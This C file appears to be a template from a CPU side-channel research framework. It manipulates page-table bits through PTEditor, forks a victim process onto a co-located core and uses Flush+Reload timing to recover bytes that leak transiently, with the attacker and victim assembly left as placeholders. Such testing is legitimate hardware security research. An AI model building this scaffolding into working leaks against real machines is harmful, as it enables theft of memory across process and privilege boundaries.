#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>
#include <sys/prctl.h>
#include <x86intrin.h>
#include <immintrin.h>

#include "ptedit_header.h"

REPLACEMENT_MARKER_ARCHMACRO
#include "cacheutils.h"

#define DATA_MEM_CONTENT 'D'
#define VICTIM_MEM_CONTENT 'V'
#define PROBE_MEM_CONTENT 'P'


enum ConditionDataPage {
  kNoUserBit,
  kNoAccessBit,
  kNoPresentBit,
  kSetUncacheable,
  kSetDirtyBit,
  kClearDirtyBit,
  kUnmaskFpFaults,
  kDefault
};

REPLACEMENT_MARKER_DATA_PAGE_EXTRA_CONDITIONS
REPLACEMENT_MARKER_DATA_PAGE_IN_TLB
REPLACEMENT_MARKER_DATA_PAGE_IN_CACHE

#define ITERATIONS 100
#define REPEAT_EXPERIMENT 1000
#define SPACING 4096
#define LEAKAGE_RUNS_PER_TEST_EXEC 1000

uint64_t kDataMemoryBegin = 0x13370000;

enum ConditionDataPage DATA_CONDITIONS[] = \
  REPLACEMENT_MARKER_DATA_CONDITION

size_t DATA_CONDITIONS_LEN = sizeof(DATA_CONDITIONS) / sizeof(enum ConditionDataPage);

unsigned int original_mxcsr_value = -1;

__attribute__((aligned(4096)))
char probe_memory[256 * 4096];

__attribute__((aligned(4096)))
char victim_mem01[2 * 4096];

__attribute__((aligned(4096)))
char victim_mem02[2 * 4096];

int data_mem_length;
char* data_page = NULL;

char* data_page_second_mapping = NULL;

int IsPermissionBitSet(const ptedit_entry_t pte, int bit) {
  return !!(pte.pte & (1ull << bit));
}

void SetInitialConditionsDataPage(int condition) {
  switch (condition) {
    case kNoUserBit: {
      ptedit_pte_clear_bit(data_page, 0, PTEDIT_PAGE_BIT_USER);
      break;
    }
    case kNoPresentBit: {
      ptedit_pte_clear_bit(data_page, 0, PTEDIT_PAGE_BIT_PRESENT);
      break;
    }
    case kSetDirtyBit: {
      ptedit_pte_set_bit(data_page, 0, PTEDIT_PAGE_BIT_DIRTY);
      break;
    }
    case kClearDirtyBit: {
      ptedit_pte_clear_bit(data_page, 0, PTEDIT_PAGE_BIT_DIRTY);
      break;
    }
    case kSetUncacheable: {
      int encoding_uncachable_memory_type = ptedit_find_first_mt(PTEDIT_MT_UC);
      ptedit_entry_t page_table_entry = ptedit_resolve(data_page, 0);
      page_table_entry.pte = ptedit_apply_mt(page_table_entry.pte, 
          encoding_uncachable_memory_type);
      // update only PTE (lowest level of page table)
      page_table_entry.valid = PTEDIT_VALID_MASK_PTE;
      ptedit_update(data_page, 0, &page_table_entry);

      // before we flush the page, we need to make sure that we have access to it
      int restore_user_bit = 0;
      int restore_present_bit = 0;
      if (!IsPermissionBitSet(page_table_entry, PTEDIT_PAGE_BIT_USER)) {
        restore_user_bit = 1;
        ptedit_pte_set_bit(data_page, 0, PTEDIT_PAGE_BIT_USER);
      }
      if (!IsPermissionBitSet(page_table_entry, PTEDIT_PAGE_BIT_PRESENT)) {
        restore_present_bit= 1;
        ptedit_pte_set_bit(data_page, 0, PTEDIT_PAGE_BIT_PRESENT);
      }

      // we also need to remove remaining data from the CPU cache
      for (size_t i = 0; i < 4096; i += 64) {
        flush(data_page + i);
      }
      mfence();

      if (restore_user_bit) {
        ptedit_pte_clear_bit(data_page, 0, PTEDIT_PAGE_BIT_USER);
      }
      if (restore_present_bit) {
        ptedit_pte_clear_bit(data_page, 0, PTEDIT_PAGE_BIT_PRESENT);
      }
      break;
    }
    case kUnmaskFpFaults: {
      // we unmask all potential floating point errors by clearing 
      // the masking bits in MXCSR. We further keep track of the prev. value
      if (original_mxcsr_value == -1u) {
        original_mxcsr_value = _mm_getcsr();
      }
      // ~0x1f80 clears bits 7-12 (the Intel MXCSR fault masking bits)
      _mm_setcsr(original_mxcsr_value & ~0x1f80);
      break;
    }
    default: {
      // kDefault
      break;
    }
  }
}

void SetShortTermConditionsDataPage(int condition) {
  switch (condition) {
    case kNoAccessBit: {
      ptedit_pte_clear_bit(data_page, 0, PTEDIT_PAGE_BIT_ACCESSED);
      break;
    }
    case kSetDirtyBit: {
      ptedit_pte_set_bit(data_page, 0, PTEDIT_PAGE_BIT_DIRTY);
      break;
    }
    case kClearDirtyBit: {
      ptedit_pte_clear_bit(data_page, 0, PTEDIT_PAGE_BIT_DIRTY);
      break;
    }
    default: {
      break;
    }
  }
}

void CleanupConditionsDataPage(int condition) {
  switch (condition) {
    case kNoUserBit: {
      ptedit_pte_set_bit(data_page, 0, PTEDIT_PAGE_BIT_USER);
      break;
    }
    case kNoPresentBit: {
      ptedit_pte_set_bit(data_page, 0, PTEDIT_PAGE_BIT_PRESENT);
      break;
    }
    case kSetDirtyBit: {
      ptedit_pte_clear_bit(data_page, 0, PTEDIT_PAGE_BIT_DIRTY);
      break;
    }
    case kSetUncacheable: {
      // TODO: implement (not important though)
      break;
    }
    case kUnmaskFpFaults: {
      // we restore the original masking flags
      assert(original_mxcsr_value != -1u);
      _mm_setcsr(original_mxcsr_value);
      break;
    }
    default: {
      break;
    }
  }
}


__attribute__((naked, aligned(4096)))
void attacker_code(
    char* data_page, 
    char* data_page_second_mapping, 
    char* probe_memory) {
  asm volatile(INTELASM(
    REPLACEMENT_MARKER_ATTACKER_CODE
  ));
}

__attribute__((naked, aligned(4096)))
void victim_code(
    char* data_page, 
    char* data_page_second_mapping, 
    char* probe_memory) {
  asm volatile(INTELASM(
    REPLACEMENT_MARKER_VICTIM_CODE
  ));
}

void CreateDataMappings() {
  // this uses the PTEditor functionality to create duplicate mappings
  data_mem_length = 2 * 4096;

  data_page = (char*)mmap(
    (void*)kDataMemoryBegin, data_mem_length,
    PROT_READ | PROT_WRITE,
    MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, 0, 0);
  if (data_page == MAP_FAILED || (uint64_t)data_page != kDataMemoryBegin) {
    printf("Could not allocate memory for data page!\n");
    exit(1);
  }

  // memset with a dummy value to make sure the page exist
  memset(data_page, 'Z', data_mem_length);

  //
  // create a new page that maps to the same PFN
  //

  // get PFN
  size_t data_page_pfn = ptedit_pte_get_pfn(data_page, 0);
  if (data_page_second_mapping == MAP_FAILED) {
    printf("Could not allocate memory for data page (second mapping): %s\n", strerror(errno));
    exit(1);
  } 
  data_page_second_mapping = (char*)ptedit_pmap(data_page_pfn << 12, data_mem_length);

  //
  // test that the duplicate mapping works
  //
  data_page_second_mapping[0] = 'A';
  data_page[0] = 'B';

  if (data_page_second_mapping[0] != 'B') {
    printf("Duplicate mapping is not working correctly!\n");
    exit(1);
  }
}

void init() {
  if (ptedit_init()) {
    printf("Error: Could not initalize PTEditor, did you load the kernel module?\n");
    exit(1);
  }
  CreateDataMappings();

  //
  // touch memory to make sure its mapped
  //
  memset(probe_memory, PROBE_MEM_CONTENT, sizeof(probe_memory));

  memset(data_page, DATA_MEM_CONTENT, sizeof(data_page));
  memset(data_page_second_mapping, 'D', sizeof(data_page_second_mapping));

  memset(victim_mem01, VICTIM_MEM_CONTENT, sizeof(victim_mem01));
  memset(victim_mem02, VICTIM_MEM_CONTENT, sizeof(victim_mem02));

  CACHE_MISS = detect_flush_reload_threshold() + 10;
  printf("Cache miss @ %zd\n", CACHE_MISS);

  signal(SIGSEGV, trycatch_segfault_handler);
  signal(SIGFPE, trycatch_segfault_handler);
  signal(SIGTRAP, trycatch_segfault_handler);
  signal(SIGILL, trycatch_segfault_handler);

  
  for (size_t i = 0; i < 256; i++) {
    flush(probe_memory + i * SPACING);
  }
  mfence();
}

void execute_leak() {
  int hits[256] = {0};

  for (int i = 0; i < DATA_CONDITIONS_LEN; i++) {
    SetInitialConditionsDataPage(DATA_CONDITIONS[i]);
  }
  for (size_t iter = 0; iter < ITERATIONS; iter++) {
    
    // reset the memory of the data page
    for (int i = 0; i < DATA_CONDITIONS_LEN; i++) {
      CleanupConditionsDataPage(DATA_CONDITIONS[i]);
    }
    memset(data_page, 'D', 4096);
    for (int i = 0; i < DATA_CONDITIONS_LEN; i++) {
      SetInitialConditionsDataPage(DATA_CONDITIONS[i]);
    }


    for (volatile size_t leakage_runs = 0;
        leakage_runs < LEAKAGE_RUNS_PER_TEST_EXEC;
        leakage_runs++) {

#ifdef DATA_PAGE_EXTRA_CONDITIONS
      // temp. remove conds
      for (int i = 0; i < DATA_CONDITIONS_LEN; i++) {
        CleanupConditionsDataPage(DATA_CONDITIONS[i]);
      }
#ifdef DATA_PAGE_IN_CACHE
      // access the first four cache lines of the data pages
      for (size_t i = 0; i < data_mem_length; i += 4096) {
        maccess(data_page + i);
        //maccess(data_page + i + 64);
        //maccess(data_page + i + 128);
        //maccess(data_page + i + 192);
      }
#else
      // flush the first four cache lines of the data pages
      for (size_t i = 0; i < data_mem_length; i += 4096) {
        flush(data_page + i);
        //flush(data_page + i + 64);
        //flush(data_page + i + 128);
        //flush(data_page + i + 192);
      }
#endif

#ifdef DATA_PAGE_IN_TLB
      // access the first four cache lines of the data pages
      for (size_t i = 0; i < data_mem_length; i += 4096) {
        maccess(data_page + i + (4096 - 64));
        //maccess(data_page + i + (4096 - 64) + 64);
        //maccess(data_page + i + (4096 - 64) + 128);
        //maccess(data_page + i + (4096 - 64) + 192);
      }
#else
      // flush the first four cache lines of the data pages
      for (size_t i = 0; i < data_mem_length; i += 4096) {
        ptedit_invalidate_tlb(data_page + i);
      }
#endif
      // restore conds
      for (int i = 0; i < DATA_CONDITIONS_LEN; i++) {
        SetInitialConditionsDataPage(DATA_CONDITIONS[i]);
      }
#endif

      for (int i = 0; i < DATA_CONDITIONS_LEN; i++) {
        SetShortTermConditionsDataPage(DATA_CONDITIONS[i]);
      }

      // make sure it's in the TLB
      maccess(probe_memory + (4096 - 64));
      mfence();

      if (!setjmp(trycatch_buf)) {
        attacker_code(
            data_page + 0x80,
            data_page_second_mapping + 0x80,
            probe_memory);
      }
    }

    mfence();
    for (size_t i = 0; i < 256; i++) {
        size_t idx = ((i * 167u) + 13u) & 255u;
        size_t delta = flush_reload_t(probe_memory + idx * SPACING);
        if (delta < CACHE_MISS) {
          hits[idx]++;
        }
    }
  }

  for (size_t i = 0; i < 256; i++) {
    if (hits[i] > 0) {
      printf("0x%zx ('%c') -> %d\n", i, i, hits[i]);
    }
  } 
  for (int i = 0; i < DATA_CONDITIONS_LEN; i++) {
    CleanupConditionsDataPage(DATA_CONDITIONS[i]);
  }
}

int main(int argc, char* argv[]) {
  int single_core_mode = 0;
  if (argc == 2 && strcmp(argv[1], "-s") == 0) {
    printf("Starting in single-core mode\n");
    single_core_mode = 1;
  }
  printf("Data Conditions:\n");
  for (int i = 0; i < DATA_CONDITIONS_LEN; i++) {
    printf("  %d\n", DATA_CONDITIONS[i]);
  }
  init();

  // set FTZ + DAZ (FPVI mitigation)
  //_mm_setcsr(_mm_getcsr() | 0x8040);  

  get_colocated_core_placement();


  if (!single_core_mode) {
    int pid = fork();
    if (pid == 0) {
      // VICTIM THREAD
      // die if parent dies
      prctl(PR_SET_PDEATHSIG, SIGKILL);
      set_cpu_affinity(VICTIM_CORE);
      while(1) {
        if (!setjmp(trycatch_buf)) {
          victim_code(victim_mem01, victim_mem02, probe_memory);
        }
      }
    }
  }

  // ATTACKER THREAD
  if (ATTACKER_CORE == -1) {
    printf("Warn: Attacker core is not set, thus we execute on the victim core.\n");
  ATTACKER_CORE = VICTIM_CORE;
  }
  printf("Attacker Core:\t%d\n", ATTACKER_CORE);
  set_cpu_affinity(ATTACKER_CORE);
  printf("--------------------\n");
  for (size_t experiment_no = 0; experiment_no < REPEAT_EXPERIMENT; experiment_no++) {
    execute_leak();
    printf("Faults: %d\n", get_fault_count());
    printf("--------------------\n");
  }

}

